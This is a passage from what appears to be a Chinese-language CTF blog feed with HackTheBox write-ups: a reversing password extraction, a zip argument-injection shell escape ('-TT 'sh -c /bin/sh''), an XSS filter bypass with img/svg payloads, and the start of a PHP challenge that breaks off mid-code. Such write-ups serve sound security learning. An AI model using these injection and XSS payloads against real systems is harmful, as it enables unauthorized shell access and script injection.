class="string">&#x27;u&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000111</span>E                 align <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000001120</span> aP              db <span class="string">&#x27;p&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001122</span>                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">0000000000001124</span> a3              db <span class="string">&#x27;3&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001126</span>                 align <span class="number">8</span></span><br><span class="line">.rodata:<span class="number">0000000000001128</span> aR              db <span class="string">&#x27;r&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000112</span>A                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">000000000000112</span>C aS              db <span class="string">&#x27;s&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000112</span>E                 align <span class="number">10</span>h</span><br><span class="line">.rodata:<span class="number">0000000000001130</span> a3_0            db <span class="string">&#x27;3&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001132</span>                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">0000000000001134</span> aC              db <span class="string">&#x27;c&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001136</span>                 align <span class="number">8</span></span><br><span class="line">.rodata:<span class="number">0000000000001138</span> aR_0            db <span class="string">&#x27;r&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000113</span>A                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">000000000000113</span>C a3_1            db <span class="string">&#x27;3&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000113</span>E                 align <span class="number">20</span>h</span><br><span class="line">.rodata:<span class="number">0000000000001140</span> aT              db <span class="string">&#x27;t&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001142</span>                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">0000000000001144</span> aW              db <span class="string">&#x27;w&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001146</span>                 align <span class="number">8</span></span><br><span class="line">.rodata:<span class="number">0000000000001148</span> a1              db <span class="string">&#x27;1&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000114</span>A                 align <span class="number">4</span></span><br><span class="line">.rodata:<span class="number">000000000000114</span>C aD              db <span class="string">&#x27;d&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">000000000000114</span>E                 align <span class="number">10</span>h</span><br><span class="line">.rodata:<span class="number">0000000000001150</span> a3_2            db <span class="string">&#x27;3&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">0000000000001152</span>                 align <span class="number">8</span></span><br></pre></td></tr></table></figure></div><p>但這邊我們順便練習一下用 pwntools 讀密碼的方式：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file = ELF(<span class="string">&quot;wide&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">start_addr = <span class="number">0x1118</span></span><br><span class="line">end_addr = <span class="number">0x1154</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_addr, end_addr, <span class="number">4</span>):</span><br><span class="line">    flag += file.read(i, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag.decode(<span class="string">&quot;ascii&quot;</span>))</span><br></pre></td></tr></table></figure></div><p>結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ python read_pw.py</span><br><span class="line">sup3rs3cr3tw1d3</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這題用 ida 開起來後就會看到 usage 是要帶上他附給</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="rev" scheme="https://kazma.tw/tags/rev/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Compressor Writeup</title>
    <link href="https://kazma.tw/2024/11/04/HackTheBox-Challenges-Compressor-Writeup/"/>
    <id>https://kazma.tw/2024/11/04/HackTheBox-Challenges-Compressor-Writeup/</id>
    <published>2024-11-04T07:18:40.634Z</published>
    <updated>2024-11-04T07:34:12.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>直接放解法：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">╰─ nc 83.136.254.158 30271                                                                                          ─╯</span><br><span class="line"></span><br><span class="line">[*] Directory to work <span class="keyword">in</span>: zdh6Ogvx31QCR9kWPu61pubPpr6TMIRa</span><br><span class="line"></span><br><span class="line">Component List:</span><br><span class="line"></span><br><span class="line">+===============+</span><br><span class="line">|               |</span><br><span class="line">|  1. Head  🤖  |</span><br><span class="line">|  2. Torso 🦴   |</span><br><span class="line">|  3. Hands 💪  |</span><br><span class="line">|  4. Legs  🦵   |</span><br><span class="line">|               |</span><br><span class="line">+===============+</span><br><span class="line"></span><br><span class="line">[*] Choose component: 1</span><br><span class="line"></span><br><span class="line">[*] Sub-directory to work <span class="keyword">in</span>: zdh6Ogvx31QCR9kWPu61pubPpr6TMIRa/Head</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Actions:</span><br><span class="line"></span><br><span class="line">1. Create artifact</span><br><span class="line">2. List directory    (<span class="built_in">pwd</span>; <span class="built_in">ls</span> -la)</span><br><span class="line">3. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)</span><br><span class="line">4. Change directory  (<span class="built_in">cd</span> &lt;<span class="built_in">dirname</span>&gt;)</span><br><span class="line">5. Clean directory   (<span class="built_in">rm</span> -rf ./*)</span><br><span class="line">6. Exit</span><br><span class="line"></span><br><span class="line">[*] Choose action: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Insert name: a</span><br><span class="line"></span><br><span class="line">Insert content: a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Artifact [a] was created successfuly!</span><br><span class="line"></span><br><span class="line">Actions:</span><br><span class="line"></span><br><span class="line">1. Create artifact</span><br><span class="line">2. List directory    (<span class="built_in">pwd</span>; <span class="built_in">ls</span> -la)</span><br><span class="line">3. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)</span><br><span class="line">4. Change directory  (<span class="built_in">cd</span> &lt;<span class="built_in">dirname</span>&gt;)</span><br><span class="line">5. Clean directory   (<span class="built_in">rm</span> -rf ./*)</span><br><span class="line">6. Exit</span><br><span class="line"></span><br><span class="line">[*] Choose action: 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Insert &lt;name&gt;.zip: a</span><br><span class="line">Insert &lt;name&gt;: a</span><br><span class="line">Insert &lt;options&gt;: -T -TT <span class="string">&#x27;sh -c /bin/sh&#x27;</span></span><br><span class="line">  adding: a (stored 0%)</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(ctf) gid=1000(ctf) <span class="built_in">groups</span>=1000(ctf)</span><br><span class="line"><span class="built_in">cat</span> ../../flag.txt</span><br><span class="line">HTB&#123;z1pp1ti_z0pp1t1_GTFO_0f_my_pr0p3rty&#125;</span><br></pre></td></tr></table></figure></div><p>這邊是利用 <code>zip</code> 的參數來開 shell：</p><ul><li>-T：zip 的 -T 參數代表「測試壓縮文件」。使用這個參數時，zip 不會進行壓縮，而是確認給定的壓縮文件的完整性。</li><li>-TT <command>：這個參數允許指定一個測試命令來進行壓縮文件的測試。然而，大部分現代 zip 工具不再支援該功能來執行自定義命令。<br>然後我們可以通過 -TT ‘sh -c &#x2F;bin&#x2F;sh’ 試圖用 sh -c &#x2F;bin&#x2F;sh 來運行一個交互式 shell。 sh -c 指定將要運行的指令，而 &#x2F;bin&#x2F;sh 則打開一個新的 shell。</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://medium.com/@vs45sharma/hackthebox-compressor-challenge-b72d4c735cb" >https://medium.com/@vs45sharma/hackthebox-compressor-challenge-b72d4c735cb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;直接放解法：&lt;/p&gt;
&lt;div class=&quot;highlig</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="misc" scheme="https://kazma.tw/tags/misc/"/>
    
    <category term="command injection" scheme="https://kazma.tw/tags/command-injection/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges SpookTastic Writeup</title>
    <link href="https://kazma.tw/2024/11/02/HackTheBox-Challenges-SpookTastic-Writeup/"/>
    <id>https://kazma.tw/2024/11/02/HackTheBox-Challenges-SpookTastic-Writeup/</id>
    <published>2024-11-02T05:39:19.850Z</published>
    <updated>2024-11-02T06:18:11.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>我們直接來看主程式：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, abort</span><br><span class="line"><span class="keyword">from</span> flask_socketio <span class="keyword">import</span> SocketIO</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">socketio = SocketIO(app)</span><br><span class="line"></span><br><span class="line">registered_emails, socket_clients = [], &#123;&#125;</span><br><span class="line"></span><br><span class="line">generate = <span class="keyword">lambda</span> x: <span class="string">&quot;&quot;</span>.join([random.choice(string.hexdigits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(x)])</span><br><span class="line">BOT_TOKEN = generate(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blacklist_pass</span>(<span class="params">email</span>):</span><br><span class="line">    email = email.lower()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;script&quot;</span> <span class="keyword">in</span> email:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">user_ip</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span>, ip <span class="keyword">in</span> socket_clients.items():</span><br><span class="line">        <span class="keyword">if</span> ip == user_ip:</span><br><span class="line">            socketio.emit(<span class="string">&quot;flag&quot;</span>, &#123;<span class="string">&quot;flag&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>).read()&#125;, room=<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_bot</span>(<span class="params">user_ip</span>):</span><br><span class="line">    <span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line">    host, port = <span class="string">&quot;localhost&quot;</span>, <span class="number">1337</span></span><br><span class="line">    HOST = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    options = Options()</span><br><span class="line"></span><br><span class="line">    options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-dev-shm-usage&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-infobars&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-background-networking&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-default-apps&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-extensions&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-gpu&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-sync&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-translate&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--hide-scrollbars&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--metrics-recording-only&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--mute-audio&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--no-first-run&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--dns-prefetch-disable&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--safebrowsing-disable-auto-update&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--media-cache-size=1&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disk-cache-size=1&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--user-agent=HTB/1.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    service = Service(executable_path=<span class="string">&quot;/usr/bin/chromedriver&quot;</span>)</span><br><span class="line">    browser = webdriver.Chrome(service=service, options=options)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        browser.get(<span class="string">f&quot;<span class="subst">&#123;HOST&#125;</span>/bot?token=<span class="subst">&#123;BOT_TOKEN&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        WebDriverWait(browser, <span class="number">3</span>).until(EC.alert_is_present())</span><br><span class="line"></span><br><span class="line">        alert = browser.switch_to.alert</span><br><span class="line">        alert.accept()</span><br><span class="line">        send_flag(user_ip)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        registered_emails.clear()</span><br><span class="line">        browser.quit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/register&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.is_json <span class="keyword">or</span> <span class="keyword">not</span> request.json[<span class="string">&quot;email&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> blacklist_pass(request.json[<span class="string">&quot;email&quot;</span>]):</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">401</span>)</span><br><span class="line"></span><br><span class="line">    registered_emails.append(request.json[<span class="string">&quot;email&quot;</span>])</span><br><span class="line">    Thread(target=start_bot, args=(request.remote_addr,)).start()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;success&quot;</span>:<span class="literal">True</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/bot&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;&quot;</span>) != BOT_TOKEN:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;bot.html&quot;</span>, emails=registered_emails)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@socketio.on(<span class="params"><span class="string">&quot;connect&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_connect</span>():</span><br><span class="line">    socket_clients[request.sid] = request.remote_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@socketio.on(<span class="params"><span class="string">&quot;disconnect&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_disconnect</span>():</span><br><span class="line">    <span class="keyword">del</span> socket_clients[request.sid]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">1337</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div><p>我們可以看到他讓我們註冊信箱，然後會檢查 email 有沒有包含 script 關鍵字，如果我們成功繞過 script 觸發 alert 就會 sendFlag，所以目標就是不含 script 的 XSS。<br>以下放上一些 payload 供參考：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;invalid.jpg&quot;</span> onerror=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/alert_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;我們直接來看主程式：&lt;/p&gt;
&lt;div class=&quot;hig</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="xss" scheme="https://kazma.tw/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Juggling facts Writeup</title>
    <link href="https://kazma.tw/2024/11/02/HackTheBox-Challenges-Juggling-facts-Writeup/"/>
    <id>https://kazma.tw/2024/11/02/HackTheBox-Challenges-Juggling-facts-Writeup/</id>
    <published>2024-11-01T17:50:29.643Z</published>
    <updated>2024-11-01T18:28:05.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題是 web，我們逛一下網站後會看到沒有明顯的輸入點，但是有三個按鈕會呈現不同的頁面，我們來看一下 code。</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">spl_autoload_register</span>(function (<span class="variable">$name</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Controller$/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;controllers/$&#123;name&#125;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/Model$/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="string">&quot;models/$&#123;name&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&quot;$&#123;name&#125;.php&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title class_">Database</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;M@k3l@R!d3s$&#x27;</span>, <span class="string">&#x27;web_juggling_facts&#x27;</span>);</span><br><span class="line"><span class="variable">$database</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$router</span> = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="variable">$router</span>-&gt;<span class="keyword">new</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;IndexController@index&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$router</span>-&gt;<span class="keyword">new</span>(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;/api/getfacts&#x27;</span>, <span class="string">&#x27;IndexController@getfacts&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$router</span>-&gt;<span class="keyword">match</span>());</span><br></pre></td></tr></table></figure></div><p>上面可以看到他設定了兩種路由，一種是 GET &#x2F; 會呼叫 IndexController 類中的 index 方法，另一個是註冊一個 POST 方法的路由，URL 路徑為 &#x2F;api&#x2F;getfacts，當發送 POST 請求至 &#x2F;api&#x2F;getfacts 路徑時，會呼叫 IndexController 類中的 getfacts 方法。那我們接著就看 <code>challenge/controllers/IndexController.php</code>：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span 